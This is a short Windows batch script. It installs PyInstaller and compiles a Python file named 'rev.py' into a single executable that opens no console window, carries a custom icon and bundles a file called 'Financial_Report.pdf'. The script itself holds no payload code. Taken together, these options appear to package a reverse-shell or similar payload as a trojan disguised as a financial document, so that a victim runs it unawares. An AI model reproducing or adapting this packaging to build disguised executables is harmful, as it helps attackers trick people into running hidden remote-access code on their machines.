@echo off

pip install pyinstaller

pyinstaller --noconsole --onefile --icon=icon.ico --add-data "Financial_Report.pdf;." rev.py


